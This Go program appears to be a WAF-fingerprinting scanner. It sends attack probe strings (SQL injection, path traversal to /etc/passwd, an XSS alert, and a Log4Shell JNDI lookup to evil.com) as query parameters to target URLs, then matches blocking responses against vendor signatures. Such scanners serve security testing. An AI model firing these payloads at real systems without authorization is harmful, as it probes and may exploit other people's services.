package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type Finding struct {
	Type     string `json:"type"`
	Severity string `json:"severity"`
	Title    string `json:"title"`
	Evidence string `json:"evidence"`
	Triage   string `json:"triage"`
}

type Event struct {
	Event   string   `json:"event"`
	Finding *Finding `json:"finding,omitempty"`
}

type WAFSignature struct {
	Name       string
	Headers    map[string]string
	BodyText   []string
	StatusCode []int
}

var wafSignatures = []WAFSignature{
	{
		Name: "Cloudflare",
		Headers: map[string]string{
			"server": "cloudflare",
			"cf-ray": "",
		},
		StatusCode: []int{403, 429},
	},
	{
		Name: "AWS WAF",
		Headers: map[string]string{
			"x-amzn-waf": "",
		},
		StatusCode: []int{403},
	},
	{
		Name:       "ModSecurity",
		BodyText:   []string{"ModSecurity", "mod_security"},
		StatusCode: []int{403},
	},
	{
		Name: "F5 BIG-IP ASM",
		Headers: map[string]string{
			"server": "BigIP",
		},
		BodyText:   []string{"The requested URL was rejected by the Web Application Firewall"},
		StatusCode: []int{403},
	},
	{
		Name: "Imperva SecureSphere",
		Headers: map[string]string{
			"x-iinfo": "",
		},
		BodyText:   []string{"Imperva", "Access Denied"},
		StatusCode: []int{403, 403},
	},
	{
		Name:       "Barracuda WAF",
		BodyText:   []string{"Barracuda", "Access Control"},
		StatusCode: []int{403},
	},
	{
		Name: "nginx",
		Headers: map[string]string{
			"server": "nginx",
		},
		StatusCode: []int{403},
	},
	{
		Name:       "Sucuri WAF",
		BodyText:   []string{"Sucuri", "block-page"},
		StatusCode: []int{403},
	},
}

func emitEvent(event string, finding *Finding) {
	e := Event{Event: event}
	if finding != nil {
		e.Finding = finding
	}
	data, _ := json.Marshal(e)
	fmt.Println(string(data))
}

func testWAF(baseURL string, timeout time.Duration, payloads []string) *Finding {
	_, err := url.Parse(baseURL)
	if err != nil {
		return nil
	}

	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Test with benign request first
	req, _ := http.NewRequest("GET", baseURL, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := client.Do(req)
	if err != nil || resp == nil {
		return nil
	}
	baselineStatus := resp.StatusCode
	resp.Body.Close()

	// Test with payloads that trigger WAF
	for _, payload := range payloads {
		testURL := baseURL + "?" + payload
		req, _ := http.NewRequest("GET", testURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Originating-IP", "[127.0.0.1]")

		resp, err := client.Do(req)
		if err != nil || resp == nil {
			continue
		}

		body, _ := io.ReadAll(io.LimitReader(resp.Body, 2000))
		resp.Body.Close()
		content := string(body)

		// Check if WAF blocked the request
		if resp.StatusCode != baselineStatus && resp.StatusCode >= 400 {
			// Fingerprint the WAF
			for _, sig := range wafSignatures {
				matched := false

				for header, val := range sig.Headers {
					headerVal := resp.Header.Get(header)
					if val == "" && headerVal != "" {
						matched = true
						break
					} else if val != "" && strings.Contains(strings.ToLower(headerVal), strings.ToLower(val)) {
						matched = true
						break
					}
				}

				if !matched {
					for _, bodyText := range sig.BodyText {
						if strings.Contains(strings.ToLower(content), strings.ToLower(bodyText)) {
							matched = true
							break
						}
					}
				}

				if matched {
					return &Finding{
						Type:     "waf-detected",
						Severity: "info",
						Title:    fmt.Sprintf("WAF detectado: %s", sig.Name),
						Evidence: fmt.Sprintf("Payload %s retornou %d em vez do %d baseline. Headers: %v", payload, resp.StatusCode, baselineStatus, resp.Header),
						Triage:   "confirmed",
					}
				}
			}

			// Generic WAF detection
			return &Finding{
				Type:     "waf-detected",
				Severity: "info",
				Title:    "WAF genérico detectado",
				Evidence: fmt.Sprintf("Payload %s retornou %d em vez do %d baseline — padrão de rate limit ou WAF típico.", payload, resp.StatusCode, baselineStatus),
				Triage:   "confirmed",
			}
		}
	}

	return nil
}

func analyzeWAF(baseURL string, timeout time.Duration) []Finding {
	var findings []Finding

	payloads := []string{
		"id=1' OR '1'='1",
		"../../../etc/passwd",
		"<script>alert(1)</script>",
		"'; DROP TABLE users; --",
		"${jndi:ldap://evil.com/a}",
		"../../../../windows/win.ini",
		"%00test",
	}

	if f := testWAF(baseURL, timeout, payloads); f != nil {
		findings = append(findings, *f)
	}

	return findings
}

func main() {
	target := os.Getenv("TARGET")
	urls := os.Getenv("URLS")
	urlsFile := os.Getenv("URLS_FILE")
	timeoutMs := os.Getenv("TIMEOUT_MS")

	if timeoutMs == "" {
		timeoutMs = "3000"
	}

	var timeoutInt int
	fmt.Sscanf(timeoutMs, "%d", &timeoutInt)
	timeout := time.Duration(timeoutInt) * time.Millisecond

	var urlList []string

	if target != "" {
		urlList = append(urlList, target)
	} else if urls != "" {
		scanner := bufio.NewScanner(strings.NewReader(urls))
		for scanner.Scan() {
			u := strings.TrimSpace(scanner.Text())
			if u != "" {
				urlList = append(urlList, u)
			}
		}
	} else if urlsFile != "" {
		file, err := os.Open(urlsFile)
		if err != nil {
			emitEvent("error", nil)
			fmt.Fprintf(os.Stderr, "erro ao abrir arquivo: %v\n", err)
			os.Exit(1)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			u := strings.TrimSpace(scanner.Text())
			if u != "" {
				urlList = append(urlList, u)
			}
		}
	}

	if len(urlList) == 0 {
		emitEvent("error", nil)
		fmt.Fprintf(os.Stderr, "nenhuma URL fornecida\n")
		os.Exit(1)
	}

	emitEvent("start", nil)

	var wg sync.WaitGroup
	var mu sync.Mutex
	sem := make(chan struct{}, 5)

	for _, u := range urlList {
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			findings := analyzeWAF(url, timeout)
			mu.Lock()
			if len(findings) == 0 {
				emitEvent("notice", nil)
			} else {
				for _, f := range findings {
					emitEvent("finding", &f)
				}
			}
			mu.Unlock()
		}(u)
	}

	wg.Wait()
	emitEvent("done", nil)
}
